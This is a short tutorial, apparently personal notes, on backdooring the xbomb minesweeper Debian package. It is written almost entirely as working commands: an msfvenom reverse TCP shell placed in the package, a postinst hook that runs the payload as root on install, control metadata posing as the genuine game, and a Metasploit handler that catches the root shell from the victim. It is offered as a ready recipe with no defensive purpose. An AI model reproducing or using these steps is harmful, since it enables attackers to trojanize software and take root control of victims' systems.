---
title: Linux Reverse TCP
---

# Linux Reverse TCP

An example to hack a 64-bit debian system using `msfvenom` on Kali Linux.

1. Download a `.deb` installation file (like `xbomb_2.2a-1_i386.deb`).

2. Extract it

   ```shell
   $ dpkg -x xbomb_2.2a-1_i386.deb workdir
   ```

3. Now, in `workdir` there are two directories `usr` and `etc`, which will be copied to the system if installed. In `usr` there is a file `game/xbomb` which is an executable file.

4. Generate the payload with `msfvenom`.

   ```shell
   $ msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.15.5 LPORT=443 -b "\x00" -f elf -o ./workdir/usr/games/xbomb_scores
   ```

5. Create directory `DEBIAN` and two files `postinst` and `control`.

   ```shell
   $ mkdir workdir/DEBIAN
   $ cat > workdir/DEBIAN/postinst << END
   #!bin/sh

   sudo chmod 2755 /usr/games/xbomb_scores && sudo /usr/games/xbomb_scores &
   END
   $ cat > workdir/DEBIAN/control << END
   Package: xbomb
   Version: 2.2a-1
   Section: games
   Priority: optional
   Architecture: amd64
   Maintainer: Ubuntu MOTU Developers <ubuntu-motu@lists.ubuntu.com>
   Description: A minesweeper game for Linux
   END
   ```

6. Create new debian package.

   ```shell
   $ dpkg-deb --build workdir
   $ mv workdir.deb xbomb_2.2a-1_x64.deb
   ```

7. Open an `msfconsole`, and open a `reverse_tcp` handler.

   ```shell
   $ msfconsole
   msf > use exploit/multi/handler
   msf > set PAYLOAD linux/x64/shell/reverse_tcp
   msf > set LHOST 192.168.15.5
   msf > set LPORT 443
   msf > run
   ```

8. Put the package in the victim machine and install it.

   ```shell
   $ sudo dpkg -i xbomb_2.2a-1_x64.deb
   ```

9. Then you will see the `msfconsole` get the session for command shell, with root previlege.
